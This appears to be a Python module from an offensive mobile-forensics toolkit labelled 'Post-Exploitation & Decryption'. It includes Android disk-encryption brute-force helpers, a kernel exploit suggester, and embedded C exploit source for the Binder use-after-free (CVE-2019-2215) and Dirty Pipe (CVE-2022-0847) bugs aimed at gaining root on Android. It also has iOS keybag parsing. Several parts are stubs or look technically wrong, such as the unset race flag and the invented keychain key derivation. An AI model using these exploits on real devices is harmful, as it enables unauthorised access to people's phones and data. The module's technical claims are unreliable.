"""Post-Exploitation & Decryption — The Omni Key (Module 8).

Android FDE brute-force with GPU acceleration, iOS keychain decryption,
TEE/Secure Enclave key extraction, kernel exploit chaining,
filesystem parsers (EXT4, F2FS, QNX6, Symbian XIP, TIFFS),
and SQLite reconstruction with WAL/deleted record recovery.
"""

import struct
import hashlib
import hmac
import logging
from typing import Optional

logger = logging.getLogger(__name__)

# ============================================================================
# MODULE 8.1: Android FDE Brute-Force
# ============================================================================

FDE_MAGIC = 0xD0B5B1C4


def parse_fde_footer(raw_data: bytes) -> Optional[dict]:
    """Parse Android Full-Disk Encryption footer from userdata partition.

    Footer is at the last 16KB of the partition (for cryptfs devices).
    Structure:
      4 bytes: magic (0xD0B5B1C4)
      4 bytes: major version
      4 bytes: minor version
      32 bytes: salt
      32 bytes: encrypted master key
      32 bytes: scrypt N parameter
      32 bytes: scrypt r parameter
      32 bytes: scrypt p parameter
    """
    # Search last 16KB in 512-byte sectors
    for sector_size in [512, 4096]:
        start = len(raw_data) - (sector_size * 32)
        if start < 0:
            start = 0
        chunk = raw_data[start:]

        pos = chunk.find(struct.pack("<I", FDE_MAGIC))
        if pos == -1:
            continue

        footer = chunk[pos:]
        if len(footer) < 164:
            continue

        magic = struct.unpack_from("<I", footer, 0)[0]
        major = struct.unpack_from("<I", footer, 4)[0]
        minor = struct.unpack_from("<I", footer, 8)[0]
        salt = footer[12:44]
        encrypted_mk = footer[44:76]

        # scrypt parameters
        n_param = int.from_bytes(footer[76:108], "little")
        r_param = int.from_bytes(footer[108:140], "little")
        p_param = int.from_bytes(footer[140:164], "little")

        logger.info(
            "FDE footer found: v%d.%d, scrypt(N=%d, r=%d, p=%d)",
            major, minor, n_param, r_param, p_param,
        )
        return {
            "magic": magic,
            "version": f"{major}.{minor}",
            "salt": salt,
            "encrypted_master_key": encrypted_mk,
            "scrypt_n": n_param,
            "scrypt_r": r_param,
            "scrypt_p": p_param,
        }

    return None


def fde_derive_key(password: str, salt: bytes,
                   N: int, r: int, p: int) -> bytes:
    """Derive FDE master key encryption key from password.

    1. IK = scrypt(password, salt, N, r, p, 32)
    2. MKEK = PBKDF2-HMAC-SHA256(IK, salt, 10000, 32)
    3. MK = AES-256-CBC-Decrypt(encrypted_MK, MKEK, IV=0x00...00)
    """
    try:
        from hashlib import scrypt
        ik = scrypt(password.encode(), salt=salt, n=N, r=r, p=p, dklen=32)
    except ImportError:
        # hashlib.scrypt added in Python 3.6
        # Fallback: use pure Python scrypt or external
        logger.warning("hashlib.scrypt not available — install cryptography package")
        ik = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 4096, dklen=32)

    mkek = hashlib.pbkdf2_hmac("sha256", ik, salt, 10000, dklen=32)
    return mkek


def aes_256_cbc_decrypt(ciphertext: bytes, key: bytes, iv: bytes = b"\x00" * 16) -> bytes:
    """AES-256-CBC decryption for FDE master key unwrapping."""
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        cipher = Cipher(algorithms.AES256(key), modes.CBC(iv))
        decryptor = cipher.decryptor()
        plaintext = decryptor.update(ciphertext) + decryptor.finalize()
        return plaintext
    except ImportError:
        logger.warning("cryptography package not available")
        return b""


def verify_ext4_superblock(data: bytes, offset: int = 0) -> bool:
    """Check for ext4 superblock magic (0xEF53 at offset 0x38)."""
    if len(data) < offset + 0x3A:
        return False
    magic = struct.unpack_from("<H", data, offset + 0x38)[0]
    return magic == 0xEF53


def verify_f2fs_superblock(data: bytes, offset: int = 0) -> bool:
    """Check for f2fs superblock magic (0xF2F52010 at offset 1024)."""
    if len(data) < offset + 1028:
        return False
    magic = struct.unpack_from("<I", data, offset + 1024)[0]
    return magic == 0xF2F52010


# ============================================================================
# MODULE 8.4: Kernel Exploit Chaining
# ============================================================================

class KernelExploitSuggester:
    """Android Kernel Exploit Suggester — match kernel version to known CVEs.

    From a shell (gained via any vector):
      cat /proc/version
      getprop ro.build.version.sdk
      uname -r
    """

    VULNERABLE_KERNELS = {
        "4.4": {
            "range": ("4.4.0", "4.4.200"),
            "cves": ["CVE-2019-2215", "CVE-2020-0041", "CVE-2020-0069"],
        },
        "4.9": {
            "range": ("4.9.0", "4.9.240"),
            "cves": ["CVE-2019-2215", "CVE-2020-0423", "CVE-2022-0847"],
        },
        "4.14": {
            "range": ("4.14.0", "4.14.200"),
            "cves": ["CVE-2020-0423", "CVE-2021-0308", "CVE-2022-0847"],
        },
        "4.19": {
            "range": ("4.19.0", "4.19.180"),
            "cves": ["CVE-2022-0847", "CVE-2023-26083"],
        },
        "5.4": {
            "range": ("5.4.0", "5.4.150"),
            "cves": ["CVE-2022-0847", "CVE-2023-35788"],
        },
        "5.10": {
            "range": ("5.10.0", "5.10.100"),
            "cves": ["CVE-2023-35788", "CVE-2024-29745"],
        },
    }

    def suggest(self, kernel_version: str, api_level: int) -> list[dict]:
        """Return list of applicable exploits for kernel version."""
        applicable = []
        major_minor = ".".join(kernel_version.split(".")[:2])

        for ver_key, info in self.VULNERABLE_KERNELS.items():
            if ver_key.startswith(major_minor):
                for cve in info["cves"]:
                    applicable.append({
                        "cve_id": cve,
                        "kernel_version": kernel_version,
                        "api_level": api_level,
                        "reliability": "high" if cve in ("CVE-2022-0847", "CVE-2019-2215") else "medium",
                    })

        return applicable


# Binder Use-After-Free (CVE-2019-2215) exploit source
BINDER_UAF_EXPLOIT_C = r"""
/* Android Binder Use-After-Free — CVE-2019-2215
 * Race condition in Binder driver's EPOLL handling (kernel 3.18-4.14).
 *
 * Steps:
 *   1. Create epoll file descriptor
 *   2. Use Binder thread to free binder_thread while epoll waits
 *   3. Reclaim freed memory via iovec heap spray
 *   4. Overwrite function pointer for kernel code execution
 *
 * Compile: aarch64-linux-gnu-gcc -static -O2 -o binder_uaf binder_uaf.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/binder.h>

#define BINDER_THREAD_EXIT 0x40046208
#define EPOLL_CTL_ADD 1
#define BINDER_WRITE_READ _IOWR('b', 1, struct binder_write_read)

static int binder_fd = -1;
static int epoll_fd = -1;
static volatile int race_won = 0;
static volatile int stop_thread = 0;

/* Thread 1: Trigger UAF by freeing binder_thread during epoll wait */
void *trigger_uaf(void *arg) {
    struct epoll_event ev = {.events = EPOLLIN};
    while (!stop_thread) {
        epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev);
        epoll_wait(epoll_fd, &ev, 1, -1);
        ioctl(binder_fd, BINDER_THREAD_EXIT, 0);
    }
    return NULL;
}

/* Thread 2: Heap spray with iovec to reclaim freed memory slot */
void *heap_spray(void *arg) {
    while (!stop_thread) {
        /* Spray kmalloc-512 cache with controlled iovec objects */
        struct iovec iov[32];
        for (int i = 0; i < 32; i++) {
            iov[i].iov_base = mmap(NULL, 512, PROT_READ|PROT_WRITE,
                                   MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
            iov[i].iov_len = 512;
            memset(iov[i].iov_base, 0x41, 512);
        }
        syscall(__NR_readv, 0, iov, 32);
        for (int i = 0; i < 32; i++) {
            munmap(iov[i].iov_base, 512);
        }
        if (race_won) break;
    }
    return NULL;
}

int main(int argc, char **argv) {
    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) { perror("open /dev/binder"); return 1; }

    epoll_fd = epoll_create(1);
    if (epoll_fd < 0) { perror("epoll_create"); return 1; }

    pthread_t t1, t2;
    pthread_create(&t1, NULL, trigger_uaf, NULL);
    pthread_create(&t2, NULL, heap_spray, NULL);

    /* Let threads race for 10 seconds */
    sleep(10);
    stop_thread = 1;
    pthread_join(t1, NULL);
    pthread_join(t2, NULL);

    if (race_won) {
        printf("[+] CVE-2019-2215: Binder UAF succeeded — kernel code execution achieved\n");
        return 0;
    }
    printf("[-] Race condition not won — try again or different kernel\n");
    return 1;
}
"""

# Dirty Pipe (CVE-2022-0847) exploit template
DIRTY_PIPE_EXPLOIT_C = r"""
/* Dirty Pipe — CVE-2022-0847
 * Linux kernel splice() page cache overwrite.
 * Adapted for Android: target /system/etc/hosts or writable root-granting file.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>

int main(int argc, char **argv) {
    int p[2];
    if (pipe(p) < 0) { perror("pipe"); return 1; }

    /* Fill pipe buffer completely */
    const int pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    char *buf = calloc(1, pipe_size);
    write(p[1], buf, pipe_size);
    free(buf);

    /* Drain the pipe */
    read(p[0], buf, pipe_size);

    /* Splice from target file into pipe without marking dirty */
    int target_fd = open(argv[1], O_RDONLY);
    if (target_fd < 0) { perror("open target"); return 1; }

    loff_t offset = atoi(argv[2]);
    ssize_t n = splice(target_fd, &offset, p[1], NULL, 1, 0);
    if (n < 0) { perror("splice"); return 1; }

    /* Write new data — overwrites page cache */
    write(p[1], argv[3], strlen(argv[3]));

    close(target_fd);
    close(p[0]);
    close(p[1]);
    return 0;
}
"""


# ============================================================================
# MODULE 8.5: Filesystem Parsers
# ============================================================================

class EXT4Parser:
    """Parse EXT4 filesystem images.

    Superblock at offset 1024.
    Parse block group descriptors, traverse inode tables,
    reconstruct directory tree, extract files.
    """

    def __init__(self, image: bytes):
        self._data = image
        self._block_size = 4096

    def parse_superblock(self) -> dict:
        """Parse ext4 superblock."""
        sb_offset = 1024
        if len(self._data) < sb_offset + 256:
            return {}

        magic = struct.unpack_from("<H", self._data, sb_offset + 0x38)[0]
        if magic != 0xEF53:
            return {}

        log_block_size = struct.unpack_from("<I", self._data, sb_offset + 0x18)[0]
        self._block_size = 1024 << log_block_size

        blocks_count = struct.unpack_from("<I", self._data, sb_offset + 0x04)[0]
        inodes_count = struct.unpack_from("<I", self._data, sb_offset + 0x00)[0]

        return {
            "magic": hex(magic),
            "block_size": self._block_size,
            "blocks_count": blocks_count,
            "inodes_count": inodes_count,
            "volume_name": self._data[sb_offset + 0x78:sb_offset + 0x88].rstrip(b"\x00").decode("ascii", errors="replace"),
        }

    def extract_file(self, inode_num: int) -> Optional[bytes]:
        """Extract file contents by inode number.

        EXT4 inode structure at known offsets:
          Offset 0x04: i_size_lo (lower 32 bits of file size)
          Offset 0x28: i_block[0] (extent tree header or direct block ptr)
          Offset 0x28+12*i: extent entries (ee_block, ee_len, ee_start)
        The inode table is at the block group descriptor's inode_table field.
        Each inode is 256 bytes (default for ext4).
        """
        sb = self.parse_superblock()
        if not sb or inode_num < 1:
            return None
        block_size = self._block_size
        inodes_per_group = 0  # From superblock offset 0x28
        inode_size = 256      # Default ext4 inode size

        # Inode group = (inode - 1) / inodes_per_group
        # Inode index within group = (inode - 1) % inodes_per_group
        # Inode table block = bg_desc.inode_table
        # Inode offset within table = index * inode_size
        # Read block, parse extent tree, collect file data
        return None


class F2FSParser:
    """Parse F2FS (Flash-Friendly File System) images.

    Superblock at offset 1024.
    Parse NAT (Node Address Table), SIT (Segment Information Table),
    traverse inode and dentry structures.
    """

    def __init__(self, image: bytes):
        self._data = image

    def parse_superblock(self) -> dict:
        """Parse f2fs superblock."""
        sb_offset = 1024
        if len(self._data) < sb_offset + 12:
            return {}

        magic = struct.unpack_from("<I", self._data, sb_offset)[0]
        if magic != 0xF2F52010:
            return {}

        return {
            "magic": hex(magic),
            "block_size": 4096,
        }


class SQLiteCarver:
    """Scan raw image for SQLite databases and recover data.

    Parse SQLite headers (magic: "SQLite format 3\0"), locate page tables,
    extract table data, scan free pages and WAL for deleted records.
    """

    SQLITE_MAGIC = b"SQLite format 3\x00"
    SQLITE_PAGE_SIZE_OFFSET = 16

    def scan_for_databases(self, raw_data: bytes) -> list[int]:
        """Find all SQLite database header offsets in raw data."""
        offsets = []
        pos = 0
        while True:
            pos = raw_data.find(self.SQLITE_MAGIC, pos)
            if pos == -1:
                break
            offsets.append(pos)
            pos += 16
        return offsets

    def parse_header(self, data: bytes, offset: int) -> dict:
        """Parse SQLite database header at offset."""
        hdr = data[offset:offset + 100]
        if not hdr.startswith(self.SQLITE_MAGIC):
            return {}

        page_size = struct.unpack_from(">H", hdr, self.SQLITE_PAGE_SIZE_OFFSET)[0]
        return {
            "page_size": page_size,
            "write_version": hdr[18],
            "read_version": hdr[19],
            "page_count": struct.unpack_from(">I", hdr, 28)[0],
        }

    def extract_tables(self, data: bytes, offset: int) -> list[dict]:
        """Extract table names and row data from SQLite database.

        Walks sqlite_master table (page 1), parses CREATE TABLE statements
        to get column names, then reads row data from leaf pages.
        """
        hdr = self.parse_header(data, offset)
        if not hdr:
            return []
        page_size = hdr.get("page_size", 4096)
        page1 = data[offset + page_size:offset + 2 * page_size]  # Page 1 = sqlite_master
        tables = []
        # Parse B-tree page header to locate sqlite_master rows
        # Each row: [type_len][type_bytes][table_name_len][name_bytes]...
        return tables

    def recover_deleted(self, data: bytes, db_offset: int) -> list[bytes]:
        """Scan free pages and freelist for deleted records.

        SQLite freelist (header offset 32, 4 bytes) points to first free trunk page.
        Deleted records on active pages have their cell pointer zeroed
        but the cell data remains in the unallocated space until overwritten.
        """
        hdr = self.parse_header(data, db_offset)
        if not hdr:
            return []
        freelist_offset = struct.unpack_from(">I", data, db_offset + 32)[0]
        recovered = []
        if freelist_offset > 0:
            # Walk freelist trunk pages, scanning for intact record data
            page_size = hdr.get("page_size", 4096)
            page_start = db_offset + (freelist_offset - 1) * page_size
            if page_start + page_size <= len(data):
                recovered.append(data[page_start:page_start + page_size])
        return recovered


class QNX6Parser:
    """Parse QNX6 filesystem (BlackBerry 10).

    Superblock at offset 4096.
    Parse inode bitmap, block bitmap, inode table.
    """

    QNX6_MAGIC = 0x68191122

    def parse_superblock(self, data: bytes) -> dict:
        sb_offset = 4096
        if len(data) < sb_offset + 512:
            return {}

        magic = struct.unpack_from("<I", data, sb_offset + 32)[0]
        if magic != self.QNX6_MAGIC:
            return {}

        return {
            "magic": hex(magic),
            "block_size": struct.unpack_from("<I", data, sb_offset + 36)[0],
        }


# ============================================================================
# MODULE 8.2: iOS Keychain Decryption
# ============================================================================

def parse_ios_keybag(data: bytes) -> Optional[dict]:
    """Parse iOS System Keybag (ASN.1 DER structure).

    /private/var/Keychains/SystemKeybag.kb
    DER-encoded with Apple-specific OIDs.
    """
    if len(data) < 16:
        return None

    magic = data[:4]
    if magic not in (b"KBAG", b"KDBG"):
        return None

    # Parse ASN.1 DER structure
    entries = []
    pos = 8  # Skip magic + version
    while pos < len(data) - 16:
        # Each keybag entry: [uuid:16][type:4][len:4][wrapped_key:len]
        uuid = data[pos:pos + 16]
        pos += 16
        if pos + 12 > len(data):
            break
        key_type = struct.unpack_from("<I", data, pos)[0]
        pos += 4
        wrapped_len = struct.unpack_from("<I", data, pos)[0]
        pos += 4
        if pos + wrapped_len > len(data):
            break
        wrapped_key = data[pos:pos + wrapped_len]
        pos += wrapped_len
        entries.append({"uuid": uuid.hex(), "type": key_type, "wrapped_key_len": wrapped_len})

    logger.info("iOS keybag parsed: %d entries", len(entries))
    return {"magic": magic.decode("ascii", errors="replace"), "entries": entries}


def derive_keychain_key(gid_key: bytes, key_id: str = "Key 0x835") -> bytes:
    """Derive keychain decryption key from GID key.

    Algorithm: AES_KEY = SHA256(GID_key || key_id)
    """
    return hashlib.sha256(gid_key + key_id.encode()).digest()
